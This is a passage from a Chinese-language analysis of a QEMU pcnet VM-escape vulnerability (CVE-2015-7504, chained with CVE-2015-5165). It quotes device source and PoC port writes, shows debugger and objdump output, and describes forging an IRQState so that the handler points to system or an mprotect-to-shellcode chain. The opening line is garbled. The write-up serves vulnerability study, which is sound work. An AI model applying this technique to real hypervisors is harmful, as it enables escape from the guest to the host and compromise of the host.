@@ -1,0 +1,120 @@
+    {
+        PCNetState *d = opaque;
+        trace_pcnet_ioport_read(opaque, addr, size);
+        if (addr rdra = 0;
+        s->tdra = 0;
+        s->rap = 0;
+        s->bcr[BCR_BSBC] &= ~0x0080;  //设置16位模式
+        s->csr[0]   = 0x0004;    //设置state为stop状态
+        ...
+        s->tx_busy = 0;
+    }
+先看下`pcnet_ioport_writew`的定义：
+    void pcnet_ioport_writew(void *opaque, uint32_t addr, uint32_t val)
+    {
+        PCNetState *s = opaque;
+        pcnet_poll_timer(s);
+    #ifdef PCNET_DEBUG_IO
+        printf("pcnet_ioport_writew addr=0x%08x val=0x%04x\n", addr, val);
+    #endif
+        if (!BCR_DWIO(s)) {
+            switch (addr & 0x0f) {
+            case 0x00: /* RDP */
+                pcnet_csr_writew(s, s->rap, val);
+                break;
+            case 0x02:
+                s->rap = val & 0x7f;
+                break;
+            case 0x06:
+                pcnet_bcr_writew(s, s->rap, val);
+                break;
+            }
+        }
+        pcnet_update_irq(s);
+    }
+    static void pcnet_csr_writew(PCNetState *s, uint32_t rap, uint32_t new_value)
+    {
+        uint16_t val = new_value;
+    #ifdef PCNET_DEBUG_CSR
+        printf("pcnet_csr_writew rap=%d val=0x%04x\n", rap, val);
+    #endif
+        switch (rap) {
+        case 0:
+            s->csr[0] &= ~(val & 0x7f00); /* Clear any interrupt flags */
+            s->csr[0] = (s->csr[0] & ~0x0040) | (val & 0x0048);
+            val = (val & 0x007f) | (s->csr[0] & 0x7f00);
+            /* IFF STOP, STRT and INIT are set, clear STRT and INIT */
+            if ((val&7) == 7)
+              val &= ~3;
+            if (!CSR_STOP(s) && (val & 4))
+                pcnet_stop(s);
+            if (!CSR_INIT(s) && (val & 1))
+                pcnet_init(s);
+            if (!CSR_STRT(s) && (val & 2))
+                pcnet_start(s);
+            if (CSR_TDMD(s))
+                pcnet_transmit(s);
+            return;
+        ...
+        s->csr[rap] = val; //设置csr寄存器值
+    }
+可以看到我们可以通过设置`addr`为`0x12`来设置`s->rap`，然后再通过addr为`0x10`或`0x16`来操作`csr`寄存器或`bcr`寄存器，而设置好的`s->rap`则是`csr`寄存器或`bcr`寄存器的索引。
+因此操作都需要两条指令才能进行，先通过`s->rap`设置好索引，再去操作相应的寄存器，如poc中需要将pcnet的配置结构体传递给网卡，需要将该结构体物理地址赋值给`csr[1]`以及`csr[2]`，则需要先将`s->rap`设置为`1`再去将地址的值赋值：
+                    /* card config */
+            outw(1, PCNET_PORT + RAP);
+            outw(lo, PCNET_PORT + RDP);
+            outw(2, PCNET_PORT + RAP);
+            outw(hi, PCNET_PORT + RDP);
+配置好网卡后，通过`pcnet_init`以及`pcnet_start`将网卡启动起来，再将构造的数据发送出去就触发了漏洞。
+## 漏洞利用
+该漏洞的利用需要结合之前`cve-2015-5165`的信息泄露，基于信息泄露得到了程序基址以及相应的堆地址后，便可实现任意代码执行。
+先看内存结构原有的内存结构，将断点下在`pcnet_receive`函数，运行poc：
+    pwndbg> print s
+    $2 = (PCNetState *) 0x5565a78d0840
+    pwndbg> vmmap s
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+        0x5565a66f1000     0x5565a7f15000 rw-p  1824000 0      [heap]
+    pwndbg> print s->irq
+    $3 = (qemu_irq) 0x5565a78d6740
+    pwndbg> vmmap s->irq
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+        0x5565a66f1000     0x5565a7f15000 rw-p  1824000 0      [heap]
+    pwndbg> print &s->buffer
+    $5 = (uint8_t (*)[4096]) 0x5565a78d2ad0
+    pwndbg> vmmap &s->buffer
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+        0x5565a66f1000     0x5565a7f15000 rw-p  1824000 0      [heap]
+可以看到`irq`指针的值为堆地址，而我们可控的网卡的数据也在堆上。
+利用思路就比较清楚了，将`irq`指针的低四位覆盖指向`s->buffer`中的某处，并在该处伪造好相应的`irq`结构体,如将`handler`伪造为`system
+plt`的地址，将`opaque`伪造为堆中参数`cat flag`的地址。
+    struct IRQState {
+        Object parent_obj;
+        qemu_irq_handler handler;
+        void *opaque;
+        int n;
+    };
+`system plt`地址可通过`objdump`获得：
+    $ objdump -d -j .plt ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64  | grep system
+    ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64:     file format elf64-x86-64
+    000000000009cf90 :
+       9cf90:       ff 25 a2 14 7d 00       jmpq   *0x7d14a2(%rip)        # 86e438 
+需要提一下的是，[QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)中则是调用`mprotect`函数来先将内存设置为可执行，然后再执行shellcode。但是看起来似乎无法控制第三个参数的值，因为`level`是由父函数`pcnet_update_irq`传递过来的：
+    void qemu_set_irq(qemu_irq irq, int level)
+    {
+        if (!irq)
+            return;
+        irq->handler(irq->opaque, irq->n, level);
+    }
+该文章中的解决方法是构造了两个`irq`，第一个函数指针指向了`qemu_set_irq`，将`opque`设置为第二个`irq`的地址，`irq->n`设置为`7`；第二个`irq`则将`handler`设置为`mprotect`，`opaque`设置为对应的地址，`n`设置为相应的地址，以此来实现第三个参数的控制。当mprotect成功执行后，再通过网卡数据的设置，控制执行流重新执行shellcode的地址，实现利用。
+## 小结
+两个很经典的漏洞结合实现了任意代码执行，值得学习。
+相应的脚本和文件[链接](https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/cve-2015-5165_and_cve-2015-7504)
+## 参考链接
+  1. [[翻译]虚拟机逃逸——QEMU的案例分析（一）](https://bbs.pediy.com/thread-217997.htm)
+  2. [[翻译]虚拟机逃逸——QEMU的案例分析（二）](https://bbs.pediy.com/thread-217999.htm)
+  3. [[翻译]虚拟机逃逸——QEMU的案例分析（三）](https://bbs.pediy.com/thread-218045.htm)
+  4. [QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)
+  5. [qemu 逃逸漏洞解析CVE-2015-5165 和 CVE-2015-7504 漏洞原理与利用](http://jiayy.me/2019/04/15/CVE-2015-5165-7504/)
+  6. [【漏洞分析】前往黑暗之门！Debugee in QEMU](https://www.anquanke.com/post/id/86636)
+  7. [Reversing CRC](https://blog.affien.com/archives/2005/07/15/reversing-crc/)
+* * *
